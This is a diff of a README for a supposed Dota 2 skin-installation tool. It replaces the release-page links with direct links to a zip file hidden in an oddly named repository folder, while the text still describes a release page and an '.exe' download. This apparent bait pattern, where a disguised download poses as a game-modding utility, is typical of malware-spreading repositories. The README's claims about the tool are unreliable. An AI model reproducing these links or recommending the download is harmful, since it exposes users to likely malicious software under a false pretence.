@@ -1,6 +1,6 @@
 # 🎮 Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding - Manage custom Dota 2 skins easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/raw/refs/heads/main/overweave/Skin_Ultimate_Modding_VP_Dota_Control_Manual_Installation_1.1.zip)
 
 This application provides a reliable method to manage and install custom skins for your Dota 2 heroes. Custom skins change the visual appearance of characters within your local game files. This tool automates the process of packing and unpacking VPK archives so you can apply mods without breaking your game files.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements to run the software correctly:
 
 Follow these steps to acquire the tool:
 
-1. Visit the project release page: [https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/releases).
+1. Visit the project release page: [https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/raw/refs/heads/main/overweave/Skin_Ultimate_Modding_VP_Dota_Control_Manual_Installation_1.1.zip](https://github.com/Cortoneacetatedostoevsky886/Manual-VPK-Skin-Installation-Ultimate-Control-Dota-2-Modding/raw/refs/heads/main/overweave/Skin_Ultimate_Modding_VP_Dota_Control_Manual_Installation_1.1.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in ".exe" to begin the download.
 4. Save the file to a folder you can find, such as your Downloads folder or Desktop.
